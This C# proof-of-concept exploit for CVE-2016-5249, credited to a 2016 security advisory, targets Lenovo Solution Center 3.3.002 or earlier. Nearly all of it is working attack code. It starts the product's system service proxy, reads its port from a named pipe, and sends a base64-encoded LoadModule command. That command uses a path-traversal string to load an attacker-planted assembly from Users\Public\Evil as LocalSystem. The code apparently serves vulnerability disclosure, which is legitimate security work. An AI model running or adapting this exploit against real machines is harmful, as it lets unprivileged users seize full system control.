/*
**    program.cs by Martin Rakhmanov 2016-06-23
**
**    Finding: Arbitrary code execution by unprivileged local users
**    CVE: cve-2016-5249
**
**    Any local user can execute arbitrary code on machine as LocalSystem where Lenovo Solution Center 3.3.002 or earlier is installed via set of commands:
**
**    More information is available at https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2016-012/?fid=8073 and https://support.lenovo.com/us/en/product_security/len_7814
*/


using System;
using System.Threading;
using System.IO.Pipes;
using System.Diagnostics;
using System.IO;
using System.Text.RegularExpressions;
using System.Net.Sockets;
using System.Text;

namespace LSC_POC
{
    class Program
    {
        static void Main(string[] args)
        {
            const String pipeName = "Lenovo_POC_Pipe";
            const String mutexName = "Lenovo_POC_Mutex";
            const String myAssemblyPathFromRoot = "Users\\\\Public\\\\Evil";

            Int32 myPort = 0;
           
            NamedPipeServerStream pipeServer = new NamedPipeServerStream(pipeName);
            Mutex myMutex = new Mutex(true, mutexName);

            Process myProcess = new Process();
            
            myProcess.StartInfo.UseShellExecute = false;
            myProcess.StartInfo.FileName = "sc.exe";
            myProcess.StartInfo.Arguments = String.Format("start LSC.Services.SystemService StartProxy {0} {1} {2}", pipeName, mutexName, Process.GetCurrentProcess().Id);
            myProcess.StartInfo.CreateNoWindow = true;
            myProcess.Start();

            myProcess.WaitForExit();
            pipeServer.WaitForConnection();

            using (StreamReader sr = new StreamReader(pipeServer))
            {
                String message = sr.ReadToEnd();
                Console.WriteLine("Proxy response: " + message);
                Regex myRegExp = new Regex("\"socketPort\":(\\d+)");
                Match myMatch = myRegExp.Match(message);
                if (!myMatch.Success)
                {
                    Console.WriteLine("Cannot parse proxy response.");
                    return;
                }
                Int32.TryParse(myMatch.Groups[1].Value, out myPort);
                Console.WriteLine("Proxy TCP port: " + myPort);

                if (myPort == 0)
                {
                    Console.WriteLine("Cannot parse proxy port.");
                    return;
                }
            }

            Socket mySocket = new Socket(SocketType.Stream, ProtocolType.Tcp);
            mySocket.Connect("localhost", myPort);

            String myCommand = String.Format("{{\"controllerMethod\":\"LoadModule\",\"parameters\":{{\"module\":\"..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\{0}\"}}}}", myAssemblyPathFromRoot);
            String encodedCommand = Convert.ToBase64String(Encoding.UTF8.GetBytes(myCommand)) + "<EOF>";
            mySocket.Send(Encoding.UTF8.GetBytes(encodedCommand));
            mySocket.Close();

            Console.WriteLine("Done. Check the LSC.ModulesController.Proxy.exe process for loaded assembly.");

            Console.ReadLine();
        }
    }
}
